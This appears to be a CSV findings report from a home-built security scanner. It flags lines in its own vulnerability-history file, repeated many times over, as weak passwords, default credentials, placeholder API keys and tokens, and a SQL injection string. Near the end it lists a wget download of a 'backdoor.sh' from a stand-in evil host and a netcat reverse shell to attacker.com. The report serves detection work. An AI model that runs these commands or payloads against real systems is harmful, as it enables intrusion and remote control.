Keyword,Severity,Confidence,OWASP,CVSS,Remediation,File,Line,Content
password,HIGH,MEDIUM,A02: Cryptographic Failures,8.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3575,"""content"": ""\""file\"": \""/Users/davidionclarksr./python-projects/secure-scan/data/urgent_payroll_password.txt\"","""
password,HIGH,MEDIUM,A02: Cryptographic Failures,8.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3583,"""content"": ""\""file\"": \""/Users/davidionclarksr./python-projects/secure-scan/data/urgent_payroll_password.txt\"","""
password,HIGH,MEDIUM,A02: Cryptographic Failures,8.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3591,"""content"": ""\""file\"": \""/Users/davidionclarksr./python-projects/secure-scan/data/urgent_payroll_password.txt\"","""
password,HIGH,MEDIUM,A02: Cryptographic Failures,8.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3597,"""finding"": ""weak_password"","
password,HIGH,MEDIUM,A02: Cryptographic Failures,8.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3604,"""remediation"": ""Enforce strong password policies."","
weak_password,HIGH,MEDIUM,A07: Identification and Authentication Failures,6.5,Enforce strong password policies.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3620,"""content"": ""\""content\"": \""Password found: password123\"""""
weak_password,HIGH,MEDIUM,A07: Identification and Authentication Failures,6.5,Enforce strong password policies.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3628,"""content"": ""\""content\"": \""Password found: password123\"""""
weak_password,HIGH,MEDIUM,A07: Identification and Authentication Failures,6.5,Enforce strong password policies.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3636,"""content"": ""\""content\"": \""Password found: password123\"""""
weak_password,HIGH,MEDIUM,A07: Identification and Authentication Failures,6.5,Enforce strong password policies.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3644,"""content"": ""\""content\"": \""Password found: password123\"""""
weak_password,HIGH,MEDIUM,A07: Identification and Authentication Failures,6.5,Enforce strong password policies.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3652,"""content"": ""\""content\"": \""Password found: password123\"""""
weak_password,HIGH,MEDIUM,A07: Identification and Authentication Failures,6.5,Enforce strong password policies.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3660,"""content"": ""\""content\"": \""Password found: password123\"""""
weak_password,HIGH,MEDIUM,A07: Identification and Authentication Failures,6.5,Enforce strong password policies.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3668,"""content"": ""\""content\"": \""Password found: password123\"""""
weak_password,HIGH,MEDIUM,A07: Identification and Authentication Failures,6.5,Enforce strong password policies.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3676,"""content"": ""\""content\"": \""Password found: password123\"""""
weak_password,HIGH,MEDIUM,A07: Identification and Authentication Failures,6.5,Enforce strong password policies.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3684,"""content"": ""\""content\"": \""Password found: password123\"""""
weak_password,HIGH,MEDIUM,A07: Identification and Authentication Failures,6.5,Enforce strong password policies.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3692,"""content"": ""\""content\"": \""Password found: password123\"""""
default_credentials,HIGH,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3721,"""content"": ""\""content\"": \""Default credentials detected: admin:admin\"""""
default_credentials,HIGH,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3729,"""content"": ""\""content\"": \""Default credentials detected: admin:admin\"""""
default_credentials,HIGH,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3737,"""content"": ""\""content\"": \""Default credentials detected: admin:admin\"""""
default_credentials,HIGH,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3745,"""content"": ""\""content\"": \""Default credentials detected: admin:admin\"""""
default_credentials,HIGH,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3753,"""content"": ""\""content\"": \""Default credentials detected: admin:admin\"""""
default_credentials,HIGH,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3761,"""content"": ""\""content\"": \""Default credentials detected: admin:admin\"""""
default_credentials,HIGH,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3769,"""content"": ""\""content\"": \""Default credentials detected: admin:admin\"""""
default_credentials,HIGH,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3777,"""content"": ""\""content\"": \""Default credentials detected: admin:admin\"""""
default_credentials,HIGH,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3785,"""content"": ""\""content\"": \""Default credentials detected: admin:admin\"""""
default_credentials,HIGH,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3793,"""content"": ""\""content\"": \""Default credentials detected: admin:admin\"""""
sql_injection_payload,HIGH,MEDIUM,A03: Injection,9.8,Use parameterized queries.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3822,"""content"": ""\""content\"": \""SQL injection attempt: ' OR '1'='1\"""""
sql_injection_payload,HIGH,MEDIUM,A03: Injection,9.8,Use parameterized queries.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3830,"""content"": ""\""content\"": \""SQL injection attempt: ' OR '1'='1\"""""
sql_injection_payload,HIGH,MEDIUM,A03: Injection,9.8,Use parameterized queries.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3838,"""content"": ""\""content\"": \""SQL injection attempt: ' OR '1'='1\"""""
sql_injection_payload,HIGH,MEDIUM,A03: Injection,9.8,Use parameterized queries.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3846,"""content"": ""\""content\"": \""SQL injection attempt: ' OR '1'='1\"""""
sql_injection_payload,HIGH,MEDIUM,A03: Injection,9.8,Use parameterized queries.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3854,"""content"": ""\""content\"": \""SQL injection attempt: ' OR '1'='1\"""""
sql_injection_payload,HIGH,MEDIUM,A03: Injection,9.8,Use parameterized queries.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3862,"""content"": ""\""content\"": \""SQL injection attempt: ' OR '1'='1\"""""
sql_injection_payload,HIGH,MEDIUM,A03: Injection,9.8,Use parameterized queries.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3870,"""content"": ""\""content\"": \""SQL injection attempt: ' OR '1'='1\"""""
sql_injection_payload,HIGH,MEDIUM,A03: Injection,9.8,Use parameterized queries.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3878,"""content"": ""\""content\"": \""SQL injection attempt: ' OR '1'='1\"""""
sql_injection_payload,HIGH,MEDIUM,A03: Injection,9.8,Use parameterized queries.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3886,"""content"": ""\""content\"": \""SQL injection attempt: ' OR '1'='1\"""""
sql_injection_payload,HIGH,MEDIUM,A03: Injection,9.8,Use parameterized queries.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3894,"""content"": ""\""content\"": \""SQL injection attempt: ' OR '1'='1\"""""
api_key_assignment,HIGH,MEDIUM,A02: Cryptographic Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3923,"""content"": ""\""content\"": \""Sensitive data exposed: api_key=12345\"""""
api_key_assignment,HIGH,MEDIUM,A02: Cryptographic Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3931,"""content"": ""\""content\"": \""Sensitive data exposed: api_key=12345\"""""
api_key_assignment,HIGH,MEDIUM,A02: Cryptographic Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3939,"""content"": ""\""content\"": \""Sensitive data exposed: api_key=12345\"""""
api_key_assignment,HIGH,MEDIUM,A02: Cryptographic Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3947,"""content"": ""\""content\"": \""Sensitive data exposed: api_key=12345\"""""
api_key_assignment,HIGH,MEDIUM,A02: Cryptographic Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3955,"""content"": ""\""content\"": \""Sensitive data exposed: api_key=12345\"""""
api_key_assignment,HIGH,MEDIUM,A02: Cryptographic Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3963,"""content"": ""\""content\"": \""Sensitive data exposed: api_key=12345\"""""
api_key_assignment,HIGH,MEDIUM,A02: Cryptographic Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3971,"""content"": ""\""content\"": \""Sensitive data exposed: api_key=12345\"""""
api_key_assignment,HIGH,MEDIUM,A02: Cryptographic Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3979,"""content"": ""\""content\"": \""Sensitive data exposed: api_key=12345\"""""
api_key_assignment,HIGH,MEDIUM,A02: Cryptographic Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3987,"""content"": ""\""content\"": \""Sensitive data exposed: api_key=12345\"""""
api_key_assignment,HIGH,MEDIUM,A02: Cryptographic Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3995,"""content"": ""\""content\"": \""Sensitive data exposed: api_key=12345\"""""
token,HIGH,MEDIUM,A02: Cryptographic Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4001,"""finding"": ""token"","
token,HIGH,MEDIUM,A02: Cryptographic Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4024,"""content"": ""\""finding\"": \""token\"","""
token,HIGH,MEDIUM,A02: Cryptographic Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4032,"""content"": ""\""finding\"": \""token\"","""
token,HIGH,MEDIUM,A02: Cryptographic Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4040,"""content"": ""\""finding\"": \""token\"","""
token,HIGH,MEDIUM,A02: Cryptographic Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4048,"""content"": ""\""finding\"": \""token\"","""
token,HIGH,MEDIUM,A02: Cryptographic Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4056,"""content"": ""\""finding\"": \""token\"","""
token,HIGH,MEDIUM,A02: Cryptographic Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4064,"""content"": ""\""finding\"": \""token\"","""
token,HIGH,MEDIUM,A02: Cryptographic Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4072,"""content"": ""\""finding\"": \""token\"","""
token,HIGH,MEDIUM,A02: Cryptographic Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4080,"""content"": ""\""finding\"": \""token\"","""
token,HIGH,MEDIUM,A02: Cryptographic Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4088,"""content"": ""\""finding\"": \""token\"","""
token,HIGH,MEDIUM,A02: Cryptographic Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4096,"""content"": ""\""finding\"": \""token\"","""
token,HIGH,MEDIUM,A02: Cryptographic Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4102,"""finding"": ""github_token"","
token,HIGH,MEDIUM,A02: Cryptographic Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4109,"""remediation"": ""Remove token and rotate credentials."","
github_token,HIGH,MEDIUM,A02: Cryptographic Failures,9.0,Remove token and rotate credentials.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4125,"""content"": ""\""content\"": \""WARN admin token exposed: ghp_exampletoken\"""""
github_token,HIGH,MEDIUM,A02: Cryptographic Failures,9.0,Remove token and rotate credentials.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4133,"""content"": ""\""content\"": \""WARN admin token exposed: ghp_exampletoken\"""""
github_token,HIGH,MEDIUM,A02: Cryptographic Failures,9.0,Remove token and rotate credentials.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4141,"""content"": ""\""content\"": \""WARN admin token exposed: ghp_exampletoken\"""""
github_token,HIGH,MEDIUM,A02: Cryptographic Failures,9.0,Remove token and rotate credentials.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4149,"""content"": ""\""content\"": \""WARN admin token exposed: ghp_exampletoken\"""""
github_token,HIGH,MEDIUM,A02: Cryptographic Failures,9.0,Remove token and rotate credentials.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4157,"""content"": ""\""content\"": \""WARN admin token exposed: ghp_exampletoken\"""""
github_token,HIGH,MEDIUM,A02: Cryptographic Failures,9.0,Remove token and rotate credentials.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4165,"""content"": ""\""content\"": \""WARN admin token exposed: ghp_exampletoken\"""""
github_token,HIGH,MEDIUM,A02: Cryptographic Failures,9.0,Remove token and rotate credentials.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4173,"""content"": ""\""content\"": \""WARN admin token exposed: ghp_exampletoken\"""""
github_token,HIGH,MEDIUM,A02: Cryptographic Failures,9.0,Remove token and rotate credentials.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4181,"""content"": ""\""content\"": \""WARN admin token exposed: ghp_exampletoken\"""""
github_token,HIGH,MEDIUM,A02: Cryptographic Failures,9.0,Remove token and rotate credentials.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4189,"""content"": ""\""content\"": \""WARN admin token exposed: ghp_exampletoken\"""""
github_token,HIGH,MEDIUM,A02: Cryptographic Failures,9.0,Remove token and rotate credentials.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4197,"""content"": ""\""content\"": \""WARN admin token exposed: ghp_exampletoken\"""""
password,HIGH,MEDIUM,A02: Cryptographic Failures,8.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4203,"""finding"": ""password_assignment"","
password_assignment,HIGH,MEDIUM,A07: Identification and Authentication Failures,8.5,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4226,"""content"": ""\""content\"": \""password=12345\"""""
password_assignment,HIGH,MEDIUM,A07: Identification and Authentication Failures,8.5,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4234,"""content"": ""\""content\"": \""password=12345\"""""
password_assignment,HIGH,MEDIUM,A07: Identification and Authentication Failures,8.5,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4242,"""content"": ""\""content\"": \""password=12345\"""""
password_assignment,HIGH,MEDIUM,A07: Identification and Authentication Failures,8.5,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4250,"""content"": ""\""content\"": \""password=12345\"""""
password_assignment,HIGH,MEDIUM,A07: Identification and Authentication Failures,8.5,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4258,"""content"": ""\""content\"": \""password=12345\"""""
password_assignment,HIGH,MEDIUM,A07: Identification and Authentication Failures,8.5,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4266,"""content"": ""\""content\"": \""password=12345\"""""
password_assignment,HIGH,MEDIUM,A07: Identification and Authentication Failures,8.5,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4274,"""content"": ""\""content\"": \""password=12345\"""""
password_assignment,HIGH,MEDIUM,A07: Identification and Authentication Failures,8.5,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4282,"""content"": ""\""content\"": \""password=12345\"""""
password_assignment,HIGH,MEDIUM,A07: Identification and Authentication Failures,8.5,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4290,"""content"": ""\""content\"": \""password=12345\"""""
password_assignment,HIGH,MEDIUM,A07: Identification and Authentication Failures,8.5,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4298,"""content"": ""\""content\"": \""password=12345\"""""
admin_endpoint,HIGH,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4327,"""content"": ""\""content\"": \""WARN Admin endpoint accessed: /admin/dashboard\"""""
admin_endpoint,HIGH,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4335,"""content"": ""\""content\"": \""WARN Admin endpoint accessed: /admin/dashboard\"""""
admin_endpoint,HIGH,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4343,"""content"": ""\""content\"": \""WARN Admin endpoint accessed: /admin/dashboard\"""""
admin_endpoint,HIGH,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4351,"""content"": ""\""content\"": \""WARN Admin endpoint accessed: /admin/dashboard\"""""
admin_endpoint,HIGH,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4359,"""content"": ""\""content\"": \""WARN Admin endpoint accessed: /admin/dashboard\"""""
admin_endpoint,HIGH,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4367,"""content"": ""\""content\"": \""WARN Admin endpoint accessed: /admin/dashboard\"""""
admin_endpoint,HIGH,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4375,"""content"": ""\""content\"": \""WARN Admin endpoint accessed: /admin/dashboard\"""""
admin_endpoint,HIGH,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4383,"""content"": ""\""content\"": \""WARN Admin endpoint accessed: /admin/dashboard\"""""
admin_endpoint,HIGH,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4391,"""content"": ""\""content\"": \""WARN Admin endpoint accessed: /admin/dashboard\"""""
admin_endpoint,HIGH,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4399,"""content"": ""\""content\"": \""WARN Admin endpoint accessed: /admin/dashboard\"""""
os_system_usage,HIGH,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4428,"""content"": ""\""content\"": \""WARN Shell execution detection: os.system(cmd)\"""""
os_system_usage,HIGH,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4436,"""content"": ""\""content\"": \""WARN Shell execution detection: os.system(cmd)\"""""
os_system_usage,HIGH,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4444,"""content"": ""\""content\"": \""WARN Shell execution detection: os.system(cmd)\"""""
os_system_usage,HIGH,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4452,"""content"": ""\""content\"": \""WARN Shell execution detection: os.system(cmd)\"""""
os_system_usage,HIGH,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4460,"""content"": ""\""content\"": \""WARN Shell execution detection: os.system(cmd)\"""""
os_system_usage,HIGH,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4468,"""content"": ""\""content\"": \""WARN Shell execution detection: os.system(cmd)\"""""
os_system_usage,HIGH,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4476,"""content"": ""\""content\"": \""WARN Shell execution detection: os.system(cmd)\"""""
os_system_usage,HIGH,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4484,"""content"": ""\""content\"": \""WARN Shell execution detection: os.system(cmd)\"""""
os_system_usage,HIGH,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4492,"""content"": ""\""content\"": \""WARN Shell execution detection: os.system(cmd)\"""""
os_system_usage,HIGH,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4500,"""content"": ""\""content\"": \""WARN Shell execution detection: os.system(cmd)\"""""
download_activity,HIGH,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4529,"""content"": ""\""content\"": \""WARN wget http://evil-site.com/backdoor.sh\"""""
download_activity,HIGH,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4537,"""content"": ""\""content\"": \""WARN wget http://evil-site.com/backdoor.sh\"""""
download_activity,HIGH,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4545,"""content"": ""\""content\"": \""WARN wget http://evil-site.com/backdoor.sh\"""""
download_activity,HIGH,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4553,"""content"": ""\""content\"": \""WARN wget http://evil-site.com/backdoor.sh\"""""
download_activity,HIGH,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4561,"""content"": ""\""content\"": \""WARN wget http://evil-site.com/backdoor.sh\"""""
download_activity,HIGH,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4569,"""content"": ""\""content\"": \""WARN wget http://evil-site.com/backdoor.sh\"""""
download_activity,HIGH,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4577,"""content"": ""\""content\"": \""WARN wget http://evil-site.com/backdoor.sh\"""""
download_activity,HIGH,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4585,"""content"": ""\""content\"": \""WARN wget http://evil-site.com/backdoor.sh\"""""
download_activity,HIGH,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4593,"""content"": ""\""content\"": \""WARN wget http://evil-site.com/backdoor.sh\"""""
download_activity,HIGH,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4601,"""content"": ""\""content\"": \""WARN wget http://evil-site.com/backdoor.sh\"""""
reverse_shell,HIGH,HIGH,A03: Injection,10.0,Investigate for malware and isolate host.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4630,"""content"": ""\""content\"": \""WARN nc -e /bin/sh attacker.com 4444\"""""
reverse_shell,HIGH,HIGH,A03: Injection,10.0,Investigate for malware and isolate host.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4638,"""content"": ""\""content\"": \""WARN nc -e /bin/sh attacker.com 4444\"""""
reverse_shell,HIGH,HIGH,A03: Injection,10.0,Investigate for malware and isolate host.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4646,"""content"": ""\""content\"": \""WARN nc -e /bin/sh attacker.com 4444\"""""
reverse_shell,HIGH,HIGH,A03: Injection,10.0,Investigate for malware and isolate host.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4654,"""content"": ""\""content\"": \""WARN nc -e /bin/sh attacker.com 4444\"""""
reverse_shell,HIGH,HIGH,A03: Injection,10.0,Investigate for malware and isolate host.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4662,"""content"": ""\""content\"": \""WARN nc -e /bin/sh attacker.com 4444\"""""
reverse_shell,HIGH,HIGH,A03: Injection,10.0,Investigate for malware and isolate host.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4670,"""content"": ""\""content\"": \""WARN nc -e /bin/sh attacker.com 4444\"""""
reverse_shell,HIGH,HIGH,A03: Injection,10.0,Investigate for malware and isolate host.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4678,"""content"": ""\""content\"": \""WARN nc -e /bin/sh attacker.com 4444\"""""
reverse_shell,HIGH,HIGH,A03: Injection,10.0,Investigate for malware and isolate host.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4686,"""content"": ""\""content\"": \""WARN nc -e /bin/sh attacker.com 4444\"""""
